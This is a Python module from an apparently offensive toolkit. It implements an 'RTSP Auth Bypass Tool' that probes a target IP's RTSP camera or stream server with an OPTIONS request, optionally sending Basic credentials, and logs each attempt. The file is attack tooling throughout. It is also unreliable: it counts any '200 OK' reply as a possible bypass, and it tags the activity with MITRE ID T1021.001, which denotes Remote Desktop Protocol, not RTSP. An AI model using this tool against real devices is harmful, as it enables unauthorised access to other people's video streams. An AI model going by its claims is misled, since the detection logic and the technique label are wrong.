# modules/exploits/rtsp_auth_bypass.py

import socket
import argparse
import base64
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1021.001"  # Remote Services: RTSP

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_rtsp_bypass(ip, port, path, user=None, pwd=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    try:
        sock.connect((ip, port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    headers = {
        "CSeq": "2",
        "User-Agent": "REDOT-RTSP",
    }

    if user and pwd:
        creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        headers["Authorization"] = f"Basic {creds}"

    request = f"OPTIONS rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
    for k, v in headers.items():
        request += f"{k}: {v}\r\n"
    request += "\r\n"

    sock.send(request.encode())
    try:
        resp = sock.recv(2048).decode(errors="ignore")
        if "200 OK" in resp:
            print(f"[âœ“] Potential RTSP bypass or access: {ip}:{port}/{path}")
        else:
            print(f"[!] RTSP auth still required or failed: {resp.splitlines()[0]}")
    except socket.timeout:
        print("[!] No response from target")
    finally:
        sock.close()

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target": f"{ip}:{port}/{path}",
        "creds_used": bool(user),
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RTSP Auth Bypass Tool")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=554, help="RTSP port (default: 554)")
    parser.add_argument("--path", default="", help="Stream path (e.g., live.sdp)")
    parser.add_argument("--user", help="Username for basic auth")
    parser.add_argument("--pwd", help="Password for basic auth")
    args = parser.parse_args()

    send_rtsp_bypass(args.ip, args.port, args.path, args.user, args.pwd)
